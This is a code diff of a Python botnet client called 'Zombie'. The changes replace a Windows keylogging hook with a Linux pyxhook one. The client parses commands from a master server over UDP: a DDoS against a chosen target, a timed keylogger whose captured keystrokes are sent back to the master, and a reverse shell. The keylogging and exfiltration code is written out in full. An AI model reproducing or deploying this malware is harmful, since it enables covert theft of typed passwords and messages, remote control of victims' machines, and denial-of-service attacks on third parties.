@@ -1,7 +1,7 @@
 import sys
 import socket
 import subprocess
-import pyHook, pythoncom, sys, logging
+import pyxhook
 import time
 
 
@@ -10,13 +10,17 @@ MASTER_PORT = 6000
 ZOMB_PORT = int(sys.argv[1])
 
 
-file_log = 'l.txt'
+log_file='/home/aman/Desktop/file.log'
+keys = ""
+last_key = ''
 
-def OnKeyboardEvent(event):
-    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-    chr(event.Ascii)
-    logging.log(10,chr(event.Ascii))
-    return True
+#this function is called everytime a key is pressed.
+def OnKeyPress(event):
+	global keys
+	global last_key
+	keys += event.Key
+	keys += " "
+	last_key = event.Key
 
 
 class Zombie:
@@ -62,33 +66,50 @@ class Zombie:
 			self.conn.sendto(stdout_value,(MASTER_IP,MASTER_PORT))
 
 	#Keylog for a time period and send data back to master
-	def keylog(self,time):
+	def keylog(self,t):
+		global keys
+		global last_key
+		keys = ""
+		last_key = ''
 
+
+		print "initializing keyboard hook..."
+		#instantiate HookManager class
+		hook=pyxhook.HookManager()
+		#listen to all keystrokes
+		hook.KeyDown=OnKeyPress
+		#hook the keyboard
+		hook.HookKeyboard()
+		#start the session
+		hook.start()
+
+		print "starting key logging..."
 		start = time.time()
-		while time.time() - start < time:
-			pythoncom.PumpWaitingMessages()
+		while time.time() - start < t:
+			if last_key=="grave": #the grave key (`)
+				break
+		hook.cancel()
+		print "stopped key logging..."
 
-		f = open(file_log,'r')
-		data = f.read()
-		self.conn.sendto("Keylog data",(MASTER_IP,MASTER_PORT))
-		self.conn.sendto(data,(MASTER_IP,MASTER_PORT))
-		f.close()
+		print "sending key data..."
+		self.conn.sendto(keys,(MASTER_IP,MASTER_PORT))
 
 	#Parse masters command
 	def parse_cmd(self,p):
 		# packet = conn.recv(1024)
-		packet = p.split(';')
+		packet = p.split(',')
 
-		#packet = "DDOS;DEST_IP;DEST_PORT"
+		#packet = "DDOS,DEST_IP,DEST_PORT"
 		if packet[0] == "DDOS":
 			self.dos(packet[1],int(packet[2]))
 
-		#packet = "KEYL;TIME"
+		#packet = "KEYL,TIME"
 		#TIME is in seconds
 		elif packet[0] == "KEYL":
+			self.conn.sendto("KEYL",(MASTER_IP,MASTER_PORT))
 			self.keylog(int(packet[1]))
 
-		#packet  = "RVSH"
+		#packet = "RVSH"
 		elif packet[0] == "RVSH":
 			self.conn.sendto("RVSH",(MASTER_IP,MASTER_PORT))				#Tell master to start sending commands
 			self.reverse_shell()
@@ -113,11 +134,9 @@ if __name__ == '__main__':
 
 	
 	zomb = Zombie(s)
-	hooks_manager = pyHook.HookManager()
-	hooks_manager.KeyDown = OnKeyboardEvent
-	hooks_manager.HookKeyboard()
 
 	while True:
+		print "\nwaiting for commands..."
 		#Receive command
 		data, addr = zomb.conn.recvfrom(1024)
 		print "reveived: " + data + " from: " + addr[0] + " " + str(addr[1])
@@ -128,8 +147,6 @@ if __name__ == '__main__':
 			# start_new_thread(zomb.parse_cmd ,(data,))
 			print "Parsing..."
 			zomb.parse_cmd(data)
-		# else:
-		# 	conn.close()
 
 
 	zomb.conn.close()
